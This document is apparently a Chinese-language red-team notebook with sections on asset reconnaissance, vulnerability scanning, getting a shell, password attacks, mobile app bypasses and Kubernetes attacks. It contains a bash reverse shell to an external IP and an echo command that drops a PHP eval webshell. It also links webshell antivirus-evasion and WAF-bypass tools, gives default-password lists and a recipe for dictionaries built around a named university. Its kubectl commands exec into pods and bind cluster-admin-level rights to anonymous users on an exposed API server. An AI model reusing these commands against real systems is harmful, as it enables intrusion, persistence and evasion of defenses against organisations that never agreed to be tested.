# 01-案例学习
```
【某师傅造的仿真环境，从GetShell到提权root】https://mp.weixin.qq.com/s/LK8zfWlz0s3v93sIY9DztQ
```

# 02-资产收集
```
目标公司 -> 通过天眼查查询父子公司 -> 通过天眼查查询供应链公司

0x01 子域名收集（通过公司根域名收集子域名）：
    01 空间测绘
    02 DNS解析
    03 SSL证书
    04 爆破子域名

0x02 IP段收集（需要判断目标是否使用CDN）：
    多地ping
    空间测绘

0x03 Web目录扫描：
    https://github.com/ffuf/ffuf

0x04 从JavaScript中提取接口：
    https://github.com/GerbenJavado/LinkFinder
    https://github.com/rtcatc/Packer-Fuzzer

0x05 Host碰撞（原理见 -> Host碰撞原理.md）：
    https://github.com/pmiaowu/HostCollision

0x06 403绕过（原理见 -> 403绕过原理.md）：
    https://github.com/asaotomo/forbiddenpass-Hx0

0x07 历史解析记录：
    https://ip138.com/

0x08 Punycode编码（从【某次攻防演练中通过一个弱口令干穿内网】https://mp.weixin.qq.com/s/lKa0SZezqh9diWe-0NqmiA这篇文章中看到Punycode编码收集资产，之前没听过这个东西，deepseek后有个基本了解，思考了一下感觉应该是：有些政府事业单位域名中使用中文，但中文的域名在录入域名系统时，需要使用Punycode编码，所以猜测作者是，使用中文对应的Punycode编码收集的子域名）：
    https://myssl.com/punycode.html
```

# 03-漏洞检测
```
https://github.com/chaitin/xray
https://github.com/projectdiscovery/nuclei
https://github.com/m-sec-org/EZ
https://github.com/zan8in/afrog

https://docs.projectdiscovery.io/templates/protocols/http/raw-http-examples
https://docs.projectdiscovery.io/templates/introduction

用nuclei进行批量漏洞检测时，如果怀疑是模板问题，可执行如下命令检查模板
nuclei.exe -validate -t template.yaml

默认线程数25
-c, -concurrency int               maximum number of templates to be executed in parallel (default 25)
```

# 04-Getshell
```
https://github.com/swisskyrepo/PayloadsAllTheThings

0x01 拿到命令执行的口子
    01、反弹shell
        1.1 先判断目标是否出网
            参见 -> xxx.md
        1.2 再判断系统有哪些可用于反弹shell的程序
            whereis bash nc exec telnet python php perl ruby java go gcc g++ curl wget
            which bash nc exec telnet python php perl ruby java go gcc g++ curl wget
        1.3 最后开始反弹shell
            /bin/bash -i >& /dev/tcp/1.1.1.1/1111 0>&1
    02、反弹shell失败，可尝试进行url编码
        https://tool.chinaz.com/tools/urlencode.aspx
    03、目标不出网时，通过echo写一句话木马
        echo "<?php eval(\$_POST['cmd']);?>">1.php
        1.php -> <?php eval($_POST['cmd']);?>

        在burp及bash下测试发现，执行如下命令
        echo "<?php eval($_POST['cmd']);?>">1.php
        1.php的内容如下，并不是正确的php一句话木马
        <?php eval(['cmd']);?>

        windows下echo "bbb">3.txt时，会将双引号带入文件内容，linux下echo "bbb">3.txt时，不会将双引号带入文件内容。
    04、echo写入失败，可尝试base64编码


0x02 webshell免杀
    https://github.com/AntSwordProject/antSword
    https://github.com/rebeyond/Behinder
    https://github.com/BeichenDream/Godzilla
    https://github.com/shack2/skyscorpion
    https://github.com/Chora10/Cknife
    https://github.com/Tas9er/ByPassBehinder4J
    https://github.com/cseroad/Webshell_Generate
    https://github.com/G0mini/Bypass
    http://bypass.tidesec.com/web/
    https://github.com/czz1233/GBByPass
    https://github.com/AabyssZG/WebShell-Bypass-Guide/tree/main

0x03 webshell绕过disable_functions执行命令
    https://github.com/mm0r1/exploits/tree/master/php-filter-bypass


0x04 webshell下过360执行命令
    https://mp.weixin.qq.com/s/OGwo1zoN1LS3aYalZ_PePw

0x05 针对php标签的WAF绕过
    # 写法1 标准写法
    <?php echo date('Y-m-d h:m:s');?>

    # 写法2 短标签，php5.4起
    <? echo 1; ?>

    # 写法3 asp风格
    <% echo 1; %>

    # 写法4 长标签写法
    <script language="php"> echo 1; </script>

0x06 瑞数动态waf绕过
    https://github.com/wjlin0/riverPass
    https://github.com/R0A1NG/Botgate_bypass

0x07 owasp top 10漏洞WAF绕过
    https://github.com/leveryd/x-waf
```

# 05-口令攻击
```
# Attack 1
    拿到一个系统，手动尝试的弱口令
    admin admin
    admin admin123
    admin admin888
    admin 123456
    test test
    test 123456

# Attack 2
    手动尝试无果后，开始爆破，爆破也是有技巧的，以（单位域名+单位名称首字母）为字典种子生成一批字典，随便选一个单位，以北京师范大学为例，种子为：
    bnu
    bjsf

    生成的字典：
    （全小写/全大写/首字母大写）1
    （全小写/全大写/首字母大写）123
    （全小写/全大写/首字母大写）@123
    （全小写/全大写/首字母大写）@（全小写/全大写/首字母大写）1
    （全小写/全大写/首字母大写）@（全小写/全大写/首字母大写）123

    爆破方式1：常见用户名/默认用户名 + 字典作为密码
    爆破方式2：字典作为用户名 + 常见密码/默认密码

# Attack 3
上面两种方式都无果的话，就掏出你的储备的字典去碰碰运气吧
```

# 06-移动端
```
绕过APP强制更新
绕过Frida反调试
绕过APP代理检测
root检测和绕过方案

Android 7.0 Https抓包单双向验证解决方案汇总
https://www.yuanrenxue.cn/app-crawl/android-7-capture-data.html

绕过SSL双向校验抓取Soul App的数据包
https://blog.csdn.net/qq_38316655/article/details/104176882

一些APP渗透测试时的小tips
https://mp.weixin.qq.com/s/IDv2ERO54TdDgvAcvx7FYQ

记某app使用autodecoder插件绕过加密数据包+重放防护
https://mp.weixin.qq.com/s/v77kfoRcP9Jo7939402Ykg

小程序自动化渗透
https://mp.weixin.qq.com/s/ebZjE_85RLIC5TZQ1JC1og
```

# 07-云安全
```
# 获取当前集群下全部node
.\kubectl -s 172.31.32.36:8089 get nodes
# 获取node详细信息
.\kubectl -s 172.31.32.36:8089 describe node 10-8-0-135
# 获取当前节点下全部pod
.\kubectl -s 172.31.32.36:8089 get pods
# 获取直接pod详细信息
.\kubectl -s 172.31.32.36:8089 describe pod wpsai-apollo-adminservice-744b6bddcd-hdngw

# 获取cluster ip
.\kubectl.exe -s 172.31.32.36:8089 -n default get service
.\kubectl.exe -s 172.31.32.36:8089 get pods -o wide
--kubelet-client-certificate=ca.crt --kubelet-client-key=token.txt
.\kubectl.exe -s 172.31.32.36:8089 --namespace=default exec -it wpsai-apollo-adminservice-744b6bddcd-hdngw bash
.\kubectl.exe -s 172.31.32.36:8089 create clusterrolebinding kube-apiserver:kubelet-apis --clusterrole=system:kubelet-api-admin --user=system:anonymous
.\kubectl -s 172.31.32.36:8089 create clusterrolebinding kube-apiserver:kubelet-apis --clusterrole=system:kubelet-api-admin --user kubernetes-master
.\kubectl -s 172.31.32.36:8089 describe pod/wpsai-apollo-adminservice-744b6bddcd-hdngw -n default
```